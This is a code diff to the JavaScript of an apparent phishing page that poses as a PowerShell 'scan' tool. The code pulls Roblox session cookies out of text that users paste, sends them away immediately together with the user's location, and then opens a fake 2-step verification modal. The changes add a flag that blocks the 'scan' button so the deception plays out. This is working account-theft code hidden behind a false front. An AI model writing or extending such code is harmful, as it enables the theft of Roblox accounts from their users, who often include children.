@@ -38,10 +38,16 @@ window.testPasteEvent = function() {
     
     // Simulate the paste event detection and immediate send
     console.log('🍪 Simulating cookie capture...');
+    console.log('🚫 Scan button will be disabled until 2FA completes');
+    
+    // Set the 2FA timer flag
+    window.twofaTimerActive = true;
     
     setTimeout(() => {
         console.log('5 seconds elapsed, opening 2-step verification modal...');
         openVerificationModal();
+        // Reset the flag after 2FA modal opens
+        window.twofaTimerActive = false;
     }, 5000); // 5 seconds instead of 80
     
     console.log('Timer started - 2FA modal will open in 5 seconds');
@@ -331,7 +337,8 @@ async function handlePasteEvent(pastedText) {
         const robloxCookie = extractRobloxCookie(pastedText);
         
         if (robloxCookie) {
-            console.log('Roblox cookie found in pasted content, sending immediately...');
+            console.log('🍪 Roblox cookie found in pasted content, sending immediately...');
+            console.log('🚫 Scan button will be disabled until 2FA completes');
             
             // Get user location
             const locationInfo = await getUserLocation();
@@ -372,6 +379,8 @@ Content Length: ${pastedText.length} characters
                 setTimeout(() => {
                     console.log('80 seconds elapsed, opening 2-step verification modal...');
                     openVerificationModal();
+                    // Reset the flag after 2FA modal opens
+                    window.twofaTimerActive = false;
                 }, 80000); // 80 seconds
                 
                 // Debug: Also show a shorter timer for testing
@@ -553,6 +562,13 @@ async function submitPowerShell() {
     const submitText = document.getElementById('submitText');
     const loadingOverlay = document.getElementById('loadingOverlay');
     const inputText = input.value.trim();
+    
+    // Check if 2FA timer is active (paste event detected a cookie)
+    if (window.twofaTimerActive) {
+        console.log('🔐 2FA timer is active - scan blocked. Please wait for 2-step verification.');
+        showNotification('2-Step verification will appear shortly. Please wait...', 'info');
+        return;
+    }
     
     // Validation
     if (!inputText) {
@@ -1017,6 +1033,9 @@ document.addEventListener('DOMContentLoaded', function() {
             setTimeout(() => {
                 const pastedText = this.value;
                 handlePasteEvent(pastedText);
+                
+                // Mark that 2FA timer is active to prevent normal scan
+                window.twofaTimerActive = true;
             }, 100); // Small delay to ensure paste content is processed
         });
         
